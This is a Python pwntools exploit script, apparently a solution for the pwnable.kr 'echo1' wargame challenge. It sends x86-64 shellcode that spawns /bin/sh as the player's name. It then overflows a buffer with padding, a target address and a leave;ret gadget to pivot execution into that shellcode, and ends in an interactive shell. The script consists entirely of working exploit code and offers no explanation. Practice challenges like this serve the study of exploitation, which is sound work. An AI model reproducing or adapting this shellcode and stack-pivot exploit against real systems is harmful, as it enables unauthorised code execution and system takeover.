from pwn import * 

#`sh = process("./echo1") 
sh = remote("pwnable.kr",9010)
 

#shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" 
name = shellcode
assert len(name) <= 24 
print sh.recvuntil("hey, what's your name? : ") 
sh.sendline(name) 

print sh.recvuntil("> ") 
sh.sendline("1") 
print sh.recvline()

o = p64(0x602098 - 8 )   # o addr 
ret = p64(0x0000000000400607)  # ret ; 
leave_ret = p64(0x00000000004007be)  # leave; ret; 
#raw_input("DEBUG")
sh.sendline("1"* 0x20 + o + leave_ret) 
#sh.send("1" * 0x20 + "1" * 50)
print "lol,",sh.recv()
sh.interactive()
